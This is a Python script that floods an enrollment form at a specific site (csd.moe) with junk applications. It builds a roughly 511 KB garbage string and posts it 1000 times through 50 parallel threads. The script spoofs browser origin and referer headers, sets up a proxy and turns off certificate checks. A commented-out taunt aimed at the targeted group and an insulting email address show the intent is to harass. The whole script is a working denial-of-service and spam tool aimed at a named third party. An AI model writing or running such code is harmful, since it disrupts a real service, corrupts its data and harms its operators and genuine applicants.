import concurrent

import requests
import json


def concat_string_to_max_byte_length(string, max_length, encoding='utf-8'):
    concatenated = ""
    current_length = 0
    string_byte_length = len(string.encode(encoding))

    # 当前长度加上字符串的长度如果小于最大长度，继续拼接
    while current_length + string_byte_length <= max_length:
        concatenated += string
        current_length += string_byte_length

    # 如果还有剩余空间，但不足以添加完整的字符串，则尝试添加部分字符串
    if current_length < max_length:
        remaining_length = max_length - current_length
        part_of_string = string.encode(encoding)[:remaining_length]

        # 尝试解码，如果失败则去掉最后一个可能不完整的字节
        while True:
            try:
                part_of_string_decoded = part_of_string.decode(encoding)
                break
            except UnicodeDecodeError:
                part_of_string = part_of_string[:-1]

        concatenated += part_of_string_decoded

    return concatenated


# 示例使用
# string_to_concat = "CSD is encroaching on our territory, CSD get out Sai !!! "
string_to_concat = "dsgvbdsbgdfsgbgggvbdfsbbbbbbbbbbbbbbbbbbbbbbbbbbbbbvdsvdsgvgdsbvdffdbfdbbbbb"
max_byte_length = 1024*511  # 最大字节长度
encoding = 'utf-8'  # 指定编码方式

result = concat_string_to_max_byte_length(string_to_concat, max_byte_length, encoding)
# print(result)  # 输出根据编码和长度限制拼接的字符串

# Define the endpoint and the headers
url = 'https://csd.moe/api/enrolls'
headers = {
    'content-type': 'application/json',
    'origin': 'https://csd.moe',
    'referer': 'https://csd.moe/apply',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
}

# Define the data payload
data = {
    "data": {
        "studentId": string_to_concat,
        "name": string_to_concat,
        "qq": string_to_concat,
        "email": "fdgdf@shabi.csd",
        "hadExperience": True,
        "applyReason": result,
        "grade": 2,
        "experience": result,
        "direction": "web"
    }
}

# Specify the number of times you want to send the request
number_of_requests = 1000

proxies = {
    'http': 'http://127.0.0.1:10809',
    'https': 'http://127.0.0.1:10809',
}

session = requests.session()

# session.verify = False
session.proxies = proxies

# Loop and send the request
import json
import requests
from concurrent.futures import ThreadPoolExecutor

# Function to be executed in a thread
def send_request(i, url, headers, data):
    with requests.Session() as session:
        response = session.post(url, headers=headers, data=json.dumps(data), verify=False)
        a= response.json()['data']["id"]
        print(f"Request {i+1}/{number_of_requests}: Status Code: {response.status_code}: {a}")
        # Optional: print response text or handle it as needed
        # print(response.text)

# Assuming number_of_requests, url, headers, and data are defined


# Disable warnings for unverified HTTPS requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Use ThreadPoolExecutor to send requests in parallel
with ThreadPoolExecutor(max_workers=50) as executor:
    # Submit all the tasks and wait for them to complete
    futures = [executor.submit(send_request, i, url, headers, data) for i in range(number_of_requests)]
    for future in concurrent.futures.as_completed(futures):
        future.result()  # If you want to handle results or exceptions


# Note: It's important to handle the response properly here, depending on your requirements.
